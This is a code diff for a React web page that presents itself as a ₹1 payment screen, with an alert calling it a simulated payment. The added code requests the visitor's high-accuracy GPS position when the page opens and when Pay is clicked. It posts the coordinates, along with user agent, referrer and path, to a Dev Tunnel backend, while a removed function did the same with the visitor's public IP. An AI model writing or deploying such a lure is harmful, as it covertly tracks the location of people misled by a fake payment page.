@@ -1,23 +1,11 @@
 import React, { useEffect } from "react";
 import "./App.css";
 
-// Replace with your Dev Tunnel backend URL
+// Dev Tunnel backend URL
 const BACKEND_URL = "https://300w2zzm-4000.inc1.devtunnels.ms";
 
-async function getPublicIp() {
-  try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    return data.ip; // public IP of the client
-  } catch (e) {
-    console.error("Could not fetch public IP", e);
-    return null;
-  }
-}
-
+// Send log to backend
 async function sendLog(action, extra = {}) {
-  const publicIp = await getPublicIp();
-
   await fetch(`${BACKEND_URL}/log`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -26,7 +14,6 @@ async function sendLog(action, extra = {}) {
       path: window.location.pathname + window.location.search,
       userAgent: navigator.userAgent,
       referrer: document.referrer,
-      clientPublicIp: publicIp,
       timestamp: new Date().toISOString(),
       ...extra,
     }),
@@ -35,11 +22,46 @@ async function sendLog(action, extra = {}) {
 
 export default function App() {
   useEffect(() => {
-    sendLog("open");
+    // Try to get precise GPS location
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLog("open", {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+          });
+        },
+        (err) => {
+          console.warn("Location denied or unavailable, falling back:", err);
+          sendLog("open"); // fallback if denied
+        },
+        { enableHighAccuracy: true }
+      );
+    } else {
+      sendLog("open"); // fallback if browser doesn't support
+    }
   }, []);
 
   const handlePayClick = () => {
-    sendLog("click_pay", { amount: "₹1" });
+    // Also try to get location when user clicks Pay
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLog("click_pay", {
+            amount: "₹1",
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+          });
+        },
+        () => {
+          sendLog("click_pay", { amount: "₹1" });
+        },
+        { enableHighAccuracy: true }
+      );
+    } else {
+      sendLog("click_pay", { amount: "₹1" });
+    }
+
     alert("Simulated payment — logged on backend!");
   };
 
